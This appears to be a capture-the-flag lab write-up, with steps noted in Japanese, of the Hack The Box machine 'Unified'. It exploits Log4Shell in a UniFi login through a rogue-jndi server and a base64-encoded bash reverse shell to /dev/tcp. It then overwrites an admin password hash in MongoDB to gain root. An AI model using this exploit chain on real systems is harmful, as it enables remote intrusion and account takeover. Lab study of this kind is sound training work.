# 1.Port Scan 
ip=10.129.210.188

sudo vi /etc/hosts

![9da3df8dd8cd6dc416c1e82117e3e88a.png](../_resources/9da3df8dd8cd6dc416c1e82117e3e88a.png)

 nmap -sC -sV $ip
 
![ba80298d1d930b14a8f360efa84083b8.png](../_resources/ba80298d1d930b14a8f360efa84083b8.png)

# 2. Web site

**URL: https://unified.htb:8443**

![4cf8963584f80a1960f668296ab4f8a9.png](../_resources/4cf8963584f80a1960f668296ab4f8a9.png)

## Burp suite

loginを試行

![65c6f346873451484eca7b5082e190e1.png](../_resources/65c6f346873451484eca7b5082e190e1.png)

`${jndi:ldap://192.168.11.50:1389/o=tomcat}`

![fe6004eae22a122a448615f95025e0bc.png](../_resources/fe6004eae22a122a448615f95025e0bc.png)

remerberを書き換え

![10984d8cc4c164c3648d1fd968834357.png](../_resources/10984d8cc4c164c3648d1fd968834357.png)

`sudo tcpdump -i tun0 port 389`

![93388df92ad329b634a8f5c1b41da642.png](../_resources/93388df92ad329b634a8f5c1b41da642.png)

burpsuiteからリクエストを送信

![a7ccce1439c8a72346694d4e93f97b35.png](../_resources/a7ccce1439c8a72346694d4e93f97b35.png)

![4e2d5bd337fb27b4aa83cc42a4f3b170.png](../_resources/4e2d5bd337fb27b4aa83cc42a4f3b170.png)

# 3.Rouge-jndi

`git clone https://github.com/veracode-research/rogue-jndi.git`

`sudo apt-get install maven` 

![cae9cc287e63c021fa1a0be0166ce58a.png](../_resources/cae9cc287e63c021fa1a0be0166ce58a.png)


echo 'bash -c bash -i >&/dev/tcp/10.10.16.18/4444 0>&1' | base64

![aac3742244cd5a2ba635fd64a06e2c8e.png](../_resources/aac3742244cd5a2ba635fd64a06e2c8e.png)

![d05c3dab7975af334cb2f3e053d6589e.png](../_resources/d05c3dab7975af334cb2f3e053d6589e.png)


出力したハッシュに書き換え

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMTgvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.18" 

![faca2e2733f41e2f4d28b1c8d64120d5.png](../_resources/faca2e2733f41e2f4d28b1c8d64120d5.png)

![a754b94479dd3fbe3b1b2f00dbc3e7b5.png](../_resources/a754b94479dd3fbe3b1b2f00dbc3e7b5.png)

4444ポートを解放

`nc -lvnp 4444`

![fad8b33a8c4e1afacb1f1dcec05a803a.png](../_resources/fad8b33a8c4e1afacb1f1dcec05a803a.png)

burpsuiteからリクエストを送信

![1d1efa8a8ab4b59afe456dd3ad1c3d11.png](../_resources/1d1efa8a8ab4b59afe456dd3ad1c3d11.png)

![f9c831772b685640434900690581df7f.png](../_resources/f9c831772b685640434900690581df7f.png)


# 4.Get user.flag

`whoami`

`script /dev/null -c bash`

![716ec60f540f1503a5ded00a357e0b29.png](../_resources/716ec60f540f1503a5ded00a357e0b29.png)

`id`

`ls /home`

`ls /home/michael`

`cd /home/michael`

`cat user.txt`

![0347599d26a948162dda320aced17ca0.png](../_resources/0347599d26a948162dda320aced17ca0.png)

## mongo DB

ps aux |grep mongo

![9f993132975b5dc881dd3e211f2e57e5.png](../_resources/9f993132975b5dc881dd3e211f2e57e5.png)


![4a251341c53e99cadeb08f564061765b.png](../_resources/4a251341c53e99cadeb08f564061765b.png)

mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"

x_shadow: "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4."


![47b9218fe8d36c3a85b0339286157cc6.png](../_resources/47b9218fe8d36c3a85b0339286157cc6.png)

![67861a4c34521beb34a7b1a24657fd51.png](../_resources/67861a4c34521beb34a7b1a24657fd51.png)

`mkpasswd -m sha-512 password1234`     

$6$d2cMSHPZ1xD1IWwn$IsP5ELWJk3AaRTG1Z8UnWiMy7MRSkFiGoaYOg90hG0UwZsfDYVLWggksjXN9U7eEO9ZBdxP0PfOHaTbFbDvrh/

![f5c35b3f6bb3a2a625d47bb0b1d08b86.png](../_resources/f5c35b3f6bb3a2a625d47bb0b1d08b86.png)


![f3736ed1ab2bc5ada4d6efd52b602bd3.png](../_resources/f3736ed1ab2bc5ada4d6efd52b602bd3.png)

mongo --port 27117 ace --eval 'db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$d2cMSHPZ1xD1IWwn$IsP5ELWJk3AaRTG1Z8UnWiMy7MRSkFiGoaYOg90hG0UwZsfDYVLWggksjXN9U7eEO9ZBdxP0PfOHaTbFbDvrh/"}})'

![5b0da8f89ae677944c3db4598310afc9.png](../_resources/5b0da8f89ae677944c3db4598310afc9.png)


user: 6ced1a6a89e666c0620cdb10262ba127

# 5.Web site 

user:administrator
password:password1234

![3b46e7625b33d20eba3101b428133730.png](../_resources/3b46e7625b33d20eba3101b428133730.png)

rootuserとpasswordを確認

![e010b3dd47ff484856ade188efd63bc8.png](../_resources/e010b3dd47ff484856ade188efd63bc8.png)

`ssh root@$ip`

![cde6083b872e53b0f385d4fb50a63463.png](../_resources/cde6083b872e53b0f385d4fb50a63463.png)